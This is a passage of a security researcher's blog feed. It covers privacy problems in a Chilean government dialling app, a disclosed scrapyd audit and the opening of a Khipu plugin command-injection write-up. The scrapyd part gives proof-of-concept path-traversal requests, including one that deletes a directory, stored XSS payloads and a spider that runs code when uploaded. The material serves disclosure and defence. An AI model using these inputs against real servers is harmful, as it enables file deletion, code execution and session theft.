+&lt;p&gt;Los casos de &lt;em&gt;Cross Site Scripting&lt;/em&gt; fueron parcialmente solucionados con una especie de &lt;a href="https://www.owasp.org/index.php/Web_Application_Firewall"&gt;firewall web&lt;/a&gt; (o biblioteca) que filtra y sanitiza ciertos vectores comunes, demostrando el poco entendimiento de cómo solucionar este tipo de vulnerabilidades. La página sigue siendo vulnerable pero momentaneamente no explotable gracias a esta solución de firewall web. Sin embargo, nuevos vectores pueden aparecer a largo plazo que esquiven las reglas del firewall web y la explotación de la vulnerabilidad vuelva a ser exitosa.&lt;/p&gt;
+&lt;p&gt;Los restantes problemas son producto del no seguimiento de sus propias &lt;a href="https://www.claveunica.gob.cl/documentacion/configuracion.html"&gt;políticas&lt;/a&gt; y la incorrecta configuración de sus servidores. Al parecer no revisten importancia ya que no fueron solucionados.&lt;/p&gt;
+&lt;p&gt;Hay una serie de cosas que no fueron notificadas, como por ejemplo el hecho de que uno puede autentificar un dominio propio con &lt;strong&gt;Clave Única&lt;/strong&gt;. Si bien no es tan simple como obtener un token en un dominio propio y luego enviarlo a cualquier servicio, esto podría encadenarse con otros errores para dar paso a una vulnerabilidad más ingeniosa.&lt;/p&gt;
+&lt;p&gt;El tiempo que demoraron en solucionar lo reportado fue alrededor de dos semanas y agradezco la forma eficiente y rápida en que el &lt;a href="http://www.csirt.gob.cl/"&gt;CSIRT&lt;/a&gt; manejo la notificación.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>El tema de la aplicación "Nueva Forma de Marcar".</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Este post busca aclarar la serie de versiones dadas tanto en Twitter como en los medios sobre el alcance de la aplicación &lt;a href="http://nuevaformademarcar.cl/ministro-gomez-lobo-presenta-aplicacion-gratuita-que-actualiza-agenda-telefonica/"&gt;&amp;quot;Nueva Forma de Marcar&amp;quot;&lt;/a&gt; lanzada por la Subsecretaria de Comunicaciones de Chile hace algunos días.&lt;/p&gt;
+&lt;p&gt;El día Lunes 25 de enero procedí a analizar la aplicación&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2016/01/el-tema-de-la-aplicacion-nueva-forma-de-marcar/</link><guid isPermaLink="false">59f734f9aade9a0001902fd2</guid><category>chile</category><category>security</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Wed, 27 Jan 2016 04:26:10 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;Este post busca aclarar la serie de versiones dadas tanto en Twitter como en los medios sobre el alcance de la aplicación &lt;a href="http://nuevaformademarcar.cl/ministro-gomez-lobo-presenta-aplicacion-gratuita-que-actualiza-agenda-telefonica/"&gt;&amp;quot;Nueva Forma de Marcar&amp;quot;&lt;/a&gt; lanzada por la Subsecretaria de Comunicaciones de Chile hace algunos días.&lt;/p&gt;
+&lt;p&gt;El día Lunes 25 de enero procedí a analizar la aplicación para ver su funcionamiento interno. Si bien es conocido su cometido, me llamo la atención una serie de estadísticas que enviaba.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-javascript"&gt;function envioEstadisticas(){
+
+    // seteamos mis totales para enviarlos
+    $scope.estadisticas.contactosTotal = $scope.contadores.contactos_totales;
+    $scope.estadisticas.numerosTotal = $scope.contadores.tlf_totales;
+    $scope.estadisticas.contactosConvertidos = $scope.contadores.contactos;
+    $scope.estadisticas.numerosConvertidos = $scope.contadores.tlf;
+    if($localstorage.get(&amp;quot;lat&amp;quot;) != &amp;quot;&amp;quot; &amp;amp;&amp;amp; $localstorage.get(&amp;quot;lng&amp;quot;) != &amp;quot;&amp;quot;){
+        $scope.estadisticas.lat = parseFloat($localstorage.get(&amp;quot;lat&amp;quot;));
+        $scope.estadisticas.lng = parseFloat($localstorage.get(&amp;quot;lng&amp;quot;));
+    }
+
+    // definimos la duracion en el tienmpo de las estadisticas
+    $scope.estadisticas.tiempo = duracion_transformacion;
+
+    // obtenemos el dispositivo UUID
+    $scope.estadisticas.deviceUUID = $cordovaDevice.getUUID();
+
+    var data = $scope.estadisticas;
+    // preparamos mi post con los datos
+    var post = new Estadisticas(data);
+    console.log(&amp;quot;envio estadisticas&amp;quot;);
+    post.$save(null, function(response){
+
+        console.log(&amp;quot;estadisticas enviadas&amp;quot;);
+    });
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En resumen, las estadísticas que envía son:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Número de contactos totales.&lt;/li&gt;
+&lt;li&gt;Número de números de teléfono totales.&lt;/li&gt;
+&lt;li&gt;Número de contactos convertidos.&lt;/li&gt;
+&lt;li&gt;Número de números de teléfono convertidos.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Ubicación del dispositivo móvil&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;UUID del dispositivo móvil&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Los dos últimos datos han sido los que han generado la controversia, tal como lo publiqué en un &lt;a href="https://twitter.com/spectresearch/status/691703962853117956"&gt;tweet&lt;/a&gt; el pasado Lunes.&lt;/p&gt;
+&lt;h2 id="aclaracindelasversiones"&gt;Aclaración de las versiones&lt;/h2&gt;
+&lt;p&gt;Haciendo referencia a este &lt;a href="http://www.emol.com/noticias/Tecnologia/2016/01/26/785375/Aclaran-el-polemico-manejo-de-datos-de-la-aplicacion-de-la-Subtel-por-cambio-de-numeracion.html"&gt;artículo de emol.com&lt;/a&gt;, podemos verificar párrafo a párrafo lo que indica.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Los Términos y Condiciones de la aplicación indican que la Subtel &amp;quot;retendrá para sí y está facultado para utilizar libremente la información estadística del uso de la aplicación&amp;quot;, incluyendo &amp;quot;la cantidad de veces que se abre, la cantidad de contactos actualizados y las zonas geográficas donde se realizó la actualización&amp;quot;. El mismo texto indica que la Subtel &amp;quot;no recopila información de la libreta de contactos del usuario&amp;quot;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Hay una serie de cuestionamientos sobre esto. El primero es que las estadísticas no son enviadas a la &lt;em&gt;Subtel&lt;/em&gt;, sino a la compañía desarrolladora de la aplicación, &lt;em&gt;Cursor S.A&lt;/em&gt;, tal como lo demuestra este fragmento de código:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-javascript"&gt;var url_server = 'http://portabilidad.cursor.cl/api/';
+
+// factory para manejar el servicio de temporada
+angular.module('app.resource', ['ngResource']).factory('Estadisticas', function($resource) {
+        return $resource(url_server+'estadisticas');
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Segundo, no son enviados usando un protocolo seguro como &lt;em&gt;HTTPS&lt;/em&gt;. Tercero, y que ha llamado bastante la atención durante la discusión, ¿para qué es necesaria la información geográfica de quién actualiza sus números?.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Las denuncias hechas en Twitter también hablaban del envío de un identificador, el &amp;quot;UUID&amp;quot;, pero Cristián Ochsenius, gerente general de Cursor indica que no es un número que permita identificar al usuario o rastrearlo. &amp;quot;Se usa para saber que la ejecución no está repetida. Si usa dos veces la aplicación, ¿cómo se sabe si fueron dos usos o una persona? Es para limpiar la información estadística&amp;quot;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ochsenius agrega que la información sobre la cantidad de uso es para que la Subtel evalúe la efectividad de la campaña de información y promoción de la aplicación, indicando que el identificador enviado al servidor se relaciona a la instalación de la aplicación y no al dispositivo en sí. De hecho, dice, si la aplicación es desinstalada y descargada de nuevo, se genera otro identificador. Los datos de uso serán entregados a la Subtel a través de informes.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Primero, lo que comenta Cristián sobre el &lt;em&gt;UUID&lt;/em&gt; es cierto para &lt;a href="https://cordova.apache.org/docs/en/2.5.0/cordova/device/device.uuid.html#ios-quirk"&gt;iOS&lt;/a&gt; (el sistema operativo usado por los iPhone) pero no para los usuarios de &lt;a href="https://github.com/apache/cordova-plugin-device/blob/master/src/android/Device.java#L111"&gt;Android&lt;/a&gt;. Tal como señalo Alejandro Vera en este &lt;a href="https://www.facebook.com/alevera.fvv/posts/10153602222074681"&gt;post&lt;/a&gt;, el &lt;em&gt;UUID&lt;/em&gt; en &lt;em&gt;Android&lt;/em&gt; será el mismo a pesar que la aplicación sea desinstalada.&lt;/p&gt;
+&lt;p&gt;Segundo es la pregunta:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;¿cómo se sabe si fueron dos usos o una persona? Es para limpiar la información estadística&lt;/em&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Por lo que entiendo, se quiere saber si fue una persona ejecutando la aplicación dos veces o dos personas ejecutandola una vez cada uno. Desde el punto de vista estadístico, los datos enviados sin poder ser relacionados con un &lt;em&gt;usuario&lt;/em&gt; son inútiles ya que como resultado se extraería información inexacta. El gran punto aquí es cómo se representa el usuario sin que se relacione con un identificador como el &lt;em&gt;UUID&lt;/em&gt;. Se podría generar un identificador aleatorio al instalar la aplicación y que puede ser utilizado cuando corresponda.&lt;/p&gt;
+&lt;p&gt;Lo que es claro es que el envío de la ubicación geográfica está demás y solo da lugar a dudas sobre el uso de esos datos.&lt;/p&gt;
+&lt;h2 id="conclusiones"&gt;Conclusiones&lt;/h2&gt;
+&lt;p&gt;Más allá de la serie de tweets que ha emitido la &lt;a href="https://twitter.com/subtel_chile/status/692153066578124802"&gt;Subtel&lt;/a&gt; y &lt;a href="https://twitter.com/huichalaf/status/692092991050088451"&gt;el subsecretario&lt;/a&gt;, es necesario ser objetivo sobre los errores cometidos y las formas de resolverlo a la brevedad posible.&lt;/p&gt;
+&lt;h6 id="update"&gt;- Update&lt;/h6&gt;
+&lt;p&gt;&lt;a href="https://twitter.com/zerial"&gt;Zerial&lt;/a&gt; también escribió un &lt;a href="http://blog.zerial.org/seguridad/nueva-forma-de-marcar-analisis-a-la-aplicacion-publicada-por-el-gobierno/"&gt;artículo&lt;/a&gt; analizando la aplicación.&lt;/p&gt;
+&lt;/div&gt;</content:encoded></item><item><title>Security Audit: Scrapyd</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;In this post I'll write about the vulnerabilities discovered in &lt;a href="https://github.com/scrapy/scrapyd"&gt;scrapyd&lt;/a&gt;, the &lt;a href="http://scrapy.org"&gt;scrapy&lt;/a&gt; daemon. It's a full review of security issues and measures to take in order to run &lt;em&gt;scrapyd&lt;/em&gt; safely.&lt;/p&gt;
+&lt;h4 id="overview"&gt;Overview&lt;/h4&gt;
+&lt;p&gt;&lt;em&gt;scrapyd&lt;/em&gt; is a &lt;em&gt;Python&lt;/em&gt; project that offers a web API for &lt;em&gt;scrapy&lt;/em&gt; project management. It's quite simple, there's&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2015/11/security-audit-scrapyd/</link><guid isPermaLink="false">59f734f9aade9a0001902fd1</guid><category>security</category><category>vulnerability</category><category>python</category><category>scrapy</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Wed, 11 Nov 2015 14:56:13 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;In this post I'll write about the vulnerabilities discovered in &lt;a href="https://github.com/scrapy/scrapyd"&gt;scrapyd&lt;/a&gt;, the &lt;a href="http://scrapy.org"&gt;scrapy&lt;/a&gt; daemon. It's a full review of security issues and measures to take in order to run &lt;em&gt;scrapyd&lt;/em&gt; safely.&lt;/p&gt;
+&lt;h4 id="overview"&gt;Overview&lt;/h4&gt;
+&lt;p&gt;&lt;em&gt;scrapyd&lt;/em&gt; is a &lt;em&gt;Python&lt;/em&gt; project that offers a web API for &lt;em&gt;scrapy&lt;/em&gt; project management. It's quite simple, there's no users nor permissions schema, it runs &lt;em&gt;scrapy&lt;/em&gt; spiders which are python files and yes, you could execute whatever you want. However, in this report I'll focus on the &lt;em&gt;API&lt;/em&gt; side, website and some measures to mitigate potential scenarios.&lt;/p&gt;
+&lt;p&gt;How it works? You have a &lt;em&gt;scrapy&lt;/em&gt; project and &lt;a href="https://scrapyd.readthedocs.org/en/latest/deploy.html"&gt;you can deploy it&lt;/a&gt; to an &lt;em&gt;scrapyd&lt;/em&gt; instance. The deployment process creates an &lt;a href="https://pythonhosted.org/setuptools/formats.html"&gt;egg file&lt;/a&gt; of your project and uploads it to the server running &lt;em&gt;scrapyd&lt;/em&gt;. Then, you can schedule spider runs on the server.&lt;/p&gt;
+&lt;h2 id="vulnerabilities"&gt;Vulnerabilities&lt;/h2&gt;
+&lt;h4 id="1projectnameandeggstorageissues"&gt;1. Project name and egg storage issues&lt;/h4&gt;
+&lt;p&gt;A malicious attacker could specify through &lt;code&gt;project&lt;/code&gt; setting in &lt;code&gt;scrapy.cfg&lt;/code&gt; the directory where to upload the egg file. It could be &lt;strong&gt;any&lt;/strong&gt; directory (escaping from &lt;code&gt;eggs_dir&lt;/code&gt; setting) where the user running &lt;em&gt;scrapyd&lt;/em&gt; has write permissions.&lt;/p&gt;
+&lt;p&gt;A malicious example:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-ini"&gt;[deploy]
+url = http://localhost:6800/
+project = ../../../../../tmp/badname
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After running &lt;code&gt;scrapyd-deploy&lt;/code&gt;, the egg will be uploaded to &lt;code&gt;/tmp/badname&lt;/code&gt; directory. It's due to that &lt;code&gt;project&lt;/code&gt; variable isn't sanitized neither in &lt;code&gt;website.AddVersion&lt;/code&gt; nor &lt;code&gt;eggstorage.FilesystemEggStorage._eggpath&lt;/code&gt; method.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;def _eggpath(self, project, version):
+    sanitized_version = re.sub(r'[^a-zA-Z0-9_-]', '_', version)
+    x = path.join(self.basedir, project, &amp;quot;%s.egg&amp;quot; % sanitized_version)
+    return x
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As seen, &lt;code&gt;path.join&lt;/code&gt; doesn't resolve directory traversal issues.&lt;/p&gt;
+&lt;h4 id="2wildcardasprojectvalue"&gt;2. Wildcard as project value&lt;/h4&gt;
+&lt;p&gt;There's an &lt;em&gt;API&lt;/em&gt; endpoint to list project versions, accepting as parameter the project name. However, you can provide wildcard character as &lt;code&gt;project&lt;/code&gt; value and it will return the versions of every project.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;curl http://localhost:6800/listversions.json?project=*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It's due that the wildcard character has an special meaning in Python &lt;code&gt;glob.glob()&lt;/code&gt; function, which is called to collect the project versions in  &lt;code&gt;eggstorage.FilesystemEggStorage.list&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;def list(self, project):
+    eggdir = path.join(self.basedir, project)
+    versions = [
+        path.splitext(path.basename(x))[0]
+        for x in glob(&amp;quot;%s/*.egg&amp;quot; % eggdir)
+    ]
+    return sorted(versions, key=LooseVersion)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I consider this a security issue in spite of the &lt;em&gt;scrapyd&lt;/em&gt; nature (projects available to everyone). First, it's not expected behaviour and someone developing a system based on &lt;em&gt;scrapyd&lt;/em&gt; would face unwanted data access if some malicious user has project names containing characters with shell meaning.&lt;/p&gt;
+&lt;h4 id="3arbitrarydirectorydeletion"&gt;3. Arbitrary directory deletion&lt;/h4&gt;
+&lt;p&gt;When you call the delete project API endpoint, it doesn't sanitize the project name and similarly to the uploading issue, in this case you can delete &lt;strong&gt;any&lt;/strong&gt; directory where the user running &lt;em&gt;scrapyd&lt;/em&gt; is owner.&lt;/p&gt;
+&lt;p&gt;In example, &lt;code&gt;scrapyd&lt;/code&gt; user owns directory  &lt;code&gt;/tmp/test&lt;/code&gt;. Making the next request, it will delete that directory.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl http://localhost:6800/delproject.json
+-d project=../../../../tmp/test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id="4executingpythoncodewhencountingspiders"&gt;4. Executing python code when counting spiders&lt;/h4&gt;
+&lt;p&gt;When you add a new project version through API endpoint &lt;code&gt;addversion.json&lt;/code&gt; the response will include the count of the spiders in the project. To calculate this real-time count, &lt;em&gt;scrapyd&lt;/em&gt; uses the function &lt;code&gt;scrapyd.utils.get_spider_list&lt;/code&gt; to get the spider list and then &lt;code&gt;len(spider_list)&lt;/code&gt; is returned.&lt;/p&gt;
+&lt;p&gt;The issue is that &lt;code&gt;get_spider_list&lt;/code&gt; calls &lt;code&gt;scrapy list&lt;/code&gt; under the hood. After using &lt;a href="http://scrapy.org"&gt;scrapy&lt;/a&gt; for years, I already know that &lt;code&gt;scrapy list&lt;/code&gt; creates the spider list by loading the spider modules to get the spider name. As you could guess, loading a python file executes their code at module level automatically. Below there's an example spider exploiting this fact.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;# -*- coding: utf-8 -*-
+import scrapy
+import commands
+
+commands.getstatusoutput('touch /tmp/test')
+
+
+class ExampleSpider(scrapy.Spider):
+    name = &amp;quot;example&amp;quot;
+    allowed_domains = [&amp;quot;example.com&amp;quot;]
+    start_urls = (
+        'http://www.example.com/',
+    )
+
+    def parse(self, response):
+        pass
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Uploading a project with this spider will create a file in &lt;code&gt;/tmp/test&lt;/code&gt; without need of running the spider. Technically, every logic using &lt;code&gt;get_spider_list&lt;/code&gt; will be affected like &lt;code&gt;listspiders.json&lt;/code&gt; and &lt;code&gt;schedule.json&lt;/code&gt;.&lt;/p&gt;
+&lt;h4 id="5storedcrosssitescriptingat"&gt;5. Stored Cross Site Scripting at /&lt;/h4&gt;
+&lt;p&gt;The home page (&lt;code&gt;http://localhost:6800/&lt;/code&gt;) lists the available projects without escaping their names, so we could create a malicious project name to exploit it. A simple pattern like &lt;code&gt;&amp;lt;script&amp;gt;code&amp;lt;/script&amp;gt;&lt;/code&gt; won't work since the slash has a path meaning when saving the project in the filesystem so it will raise an exception. However, there are many ways to exploit a &lt;code&gt;XSS&lt;/code&gt; that setting the next example works great:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-ini"&gt;[deploy]
+url = http://localhost:6800/
+project = &amp;lt;img onerror=alert(1); src=x&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/scrapyd_homepage_xss.png" style="height:400px; width:700px"&gt;
+&lt;h4 id="6storedcrosssitescriptingatjobs"&gt;6. Stored Cross Site Scripting at /jobs&lt;/h4&gt;
+&lt;p&gt;The jobs page (&lt;code&gt;http://localhost:6800/jobs&lt;/code&gt;) lists the jobs summary without escaping project name, spider name and job id. Even project name isn't exploitable since a right payload generates exceptions when &lt;em&gt;scrapyd&lt;/em&gt; tries to load the project, the other variables are useful to embed javascript code.&lt;/p&gt;
+&lt;p&gt;Exploiting it through job id is as simple as sending a malicious value in &lt;code&gt;jobid&lt;/code&gt; parameter to the schedule endpoint and then loading jobs page.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl http://localhost:6800/schedule.json 
+-d project=test -d spider=example 
+-d jobid='&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/scrapyd_jobs_jobid_xss.png" style="height:250px; width:625px"&gt;
+&lt;p&gt;To exploit spider name is required to have a spider with the payload as name, like in this snippet:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;class ExampleSpider(scrapy.Spider):
+    name = &amp;quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So, sending the request with a malicious value in &lt;code&gt;spider&lt;/code&gt; parameter and then loading the jobs page shows the alert pop-up.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl http://localhost:6800/schedule.json 
+-d project=test -d spider='&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src="http://cdn.spect.cl/blog/posts/images/scrapyd_jobs_spider_name_xss.png" style="height:250px; width:625px"&gt;
+&lt;h4 id="7jobidandspidernamecausingdirectorytraversal"&gt;7. Job id and spider name causing directory traversal&lt;/h4&gt;
+&lt;p&gt;Creating a malicious spider name:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-python"&gt;class ExampleSpider(scrapy.Spider):
+    name = &amp;quot;../../../../../tmp/spider&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;and then scheduling it will save the jobs log and data in &lt;em&gt;any&lt;/em&gt; directory where the user running &lt;em&gt;scrapyd&lt;/em&gt; has write permissions. The log of &lt;em&gt;scrapyd&lt;/em&gt; clearly shows it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;2015-11-07 11:11:17+0000 [-] Process started:  project='test' spider='../../../../../tmp/spider' job='41bb4228854011e58aa00242ac110002' pid=86 log='logs/test/../../../../../tmp/spider/41bb4228854011e58aa00242ac110002.log' items='file:///tmp/spider/41bb4228854011e58aa00242ac110002.jl'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The same can be achieved with a malicious &lt;code&gt;jobid&lt;/code&gt; argument that contains a directory traversal pattern:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ curl http://localhost:6800/schedule.json -d project=test -d spider=spider -d jobid=&amp;quot;../../../../../tmp/myjob&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And the &lt;em&gt;scrapyd&lt;/em&gt; log shows:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;2015-11-07 11:22:47+0000 [-] Process started:  project='test' spider='spider' job='../../../../../tmp/myjob' pid=104 log='logs/test/spider/../../../../../tmp/myjob.log' items='file:///tmp/myjob.jl'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id="measures"&gt;Measures&lt;/h2&gt;
+&lt;h4 id="runningconditions"&gt;Running conditions&lt;/h4&gt;
+&lt;p&gt;&lt;em&gt;scrapyd&lt;/em&gt; runs without any authentication, listen to &lt;strong&gt;any&lt;/strong&gt; &lt;em&gt;IP&lt;/em&gt; and allows to execute &lt;em&gt;Python&lt;/em&gt; code in the machine running it. In short terms, it's an open remote terminal. Some attacker could scan the network looking for &lt;em&gt;TCP&lt;/em&gt; port 6800 (used by default) and quickly deploy a spider that executes a reverse shell. There are two ways to prevent it:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Listen only to &lt;code&gt;localhost&lt;/code&gt; meeting the same threats as running a debug tool of current web frameworks like &lt;a href="https://pypi.python.org/pypi/django-debug-toolbar"&gt;django-debug-toolbar&lt;/a&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Implement Basic authentication by default, which forces the user to set a password at least.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="fixes"&gt;Fixes&lt;/h2&gt;
+&lt;p&gt;I've opened some issues in &lt;a href="https://github.com/scrapy/scrapyd/issues"&gt;scrapyd issue tracker&lt;/a&gt; to solve the exposed vulnerabilities. I have some ideas about fixing the issues but certainly it's better to have some feedback on them. To track the progress, the issues are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/scrapy/scrapyd/issues/117"&gt;Project name sanitization&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;</content:encoded></item><item><title>Command injection in Khipu Firefox plugin</title><description>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;In April 2014 I reported a vulnerability in the Firefox plugin of &lt;a href="https://khipu.com/"&gt;Khipu&lt;/a&gt;, which comes by default with the &lt;em&gt;Khipu&lt;/em&gt; package for Linux. I received a fast response from them but they never notified me when the fixed version was available.&lt;/p&gt;
+&lt;p&gt;Some months ago I tried again and the vulnerability&lt;/p&gt;&lt;/div&gt;</description><link>http://spect.cl/blog/2015/09/command-injection-in-khipu-firefox-plugin/</link><guid isPermaLink="false">59f734f8aade9a0001902fc0</guid><category>security</category><category>vulnerability</category><category>chile</category><dc:creator>Claudio Salazar</dc:creator><pubDate>Sun, 13 Sep 2015 23:24:00 GMT</pubDate><content:encoded>&lt;div class="kg-card-markdown"&gt;&lt;p&gt;In April 2014 I reported a vulnerability in the Firefox plugin of &lt;a href="https://khipu.com/"&gt;Khipu&lt;/a&gt;, which comes by default with the &lt;em&gt;Khipu&lt;/em&gt; package for Linux. I received a fast response from them but they never notified me when the fixed version was available.&lt;/p&gt;
+&lt;p&gt;Some months ago I tried again and the vulnerability was fixed. So I think I can talk about it now.&lt;/p&gt;
+&lt;h2 id="thevulnerability"&gt;The vulnerability&lt;/h2&gt;
+&lt;p&gt;If you want to pay with &lt;em&gt;Khipu&lt;/em&gt; from Linux, you can download the application for Linux available &lt;a href="https://khipu.com/page/terminal-de-pago"&gt;here&lt;/a&gt;. Listing the files that the package contains we can see that there's a &lt;em&gt;Firefox&lt;/em&gt; plugin called &lt;code&gt;npKHPlugin.so&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash"&gt;$ dpkg -c khipu_1.15.1511.1_amd64.deb
+drwx------ 0/0               0 2015-05-14 20:50 ./
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/lib/
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/lib/mozilla/
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/lib/mozilla/plugins/
+-rwxr-xr-x 0/0         2781439 2015-05-14 20:49 ./usr/lib/mozilla/plugins/npKHPlugin.so
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/share/
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/share/applications/
+-rwxr-xr-x 0/0             268 2015-05-14 20:50 ./usr/share/applications/khipu.desktop
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/share/khipu/
+-rwxr-xr-x 0/0           64549 2015-05-14 20:50 ./usr/share/khipu/icon.png
+-rwxr-xr-x 0/0             253 2015-05-14 20:50 ./usr/share/khipu/com.khipu.chrome.json
+drwxr-xr-x 0/0               0 2015-05-14 20:50 ./usr/bin/
+-rwxr-xr-x 0/0          798936 2015-05-14 20:50 ./usr/bin/khipu
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It's the last version of the package. However, in this post I'll be talking about the version &lt;code&gt;1.0.2.1&lt;/code&gt; available on April 2014 and such file is available here: &lt;a href="http://cdn.spect.cl/blog/files/vulnerable_npKHPlugin.so"&gt;vulnerable_npKHPlugin.so&lt;/a&gt; (&lt;code&gt;f2a2ac4d2842f7a284e7fccaa2918844&lt;/code&gt;). We have to consider that at that time the &lt;em&gt;Firefox&lt;/em&gt; version was 28.0, which was important to run the exploit stealthily.&lt;/p&gt;
+&lt;p&gt;I was curious because the Linux package had a binary application and a &lt;em&gt;Firefox&lt;/em&gt; plugin, so they had to communicate each other. I simulated a purchase and when it was time to pay with &lt;em&gt;Khipu&lt;/em&gt;, &lt;em&gt;Firefox&lt;/em&gt; popped up magically the binary application.&lt;/p&gt;
+&lt;p&gt;I examined the plugin file with &lt;code&gt;strings&lt;/code&gt; to look for some interesting data and I got one!&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-bash&amp;quot;"&gt;$ strings vulnerable_plugin.so | grep khipu
+/usr/bin/khipu %s &amp;amp;
+khipu_version
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;em&gt;Khipu&lt;/em&gt; binary works with the &lt;code&gt;transaction_id&lt;/code&gt; as argument, which is a number. It seems that the plugin is calling the binary just concatenating the &lt;code&gt;transaction_id&lt;/code&gt; without escaping it, making possible command injection. That was my guess and it was true.&lt;/p&gt;
+&lt;p&gt;With the help of &lt;a href="http://www.hopperapp.com/"&gt;HopperApp&lt;/a&gt; and making the code more readable, I could rewrite the vulnerable code:&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-language-c++"&gt;#include &amp;lt;iostream&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string&amp;gt;
+
+using namespace std;
+
+int callKH(string khipu_id) {
+    char *cmdline_str;
+    cmdline_str = (char *) malloc(1024);
+
+    sprintf(cmdline_str, &amp;quot;/usr/bin/khipu %s &amp;amp;&amp;quot;, khipu_id.c_str());
+    system(cmdline_str);
+    free(cmdline_str);
+
+    return 0;
+}
+
+int main (int argc, char* argv[])
+{
+    //callKH(&amp;quot;12345&amp;quot;);  //normal call
+    callKH(argv[1]);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There are two things to note:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;The code is effectively vulnerable to &lt;em&gt;command injection&lt;/em&gt; since &lt;code&gt;khipu_id&lt;/code&gt; isn't sanitized and is included as parameter in the call to &lt;code&gt;system()&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
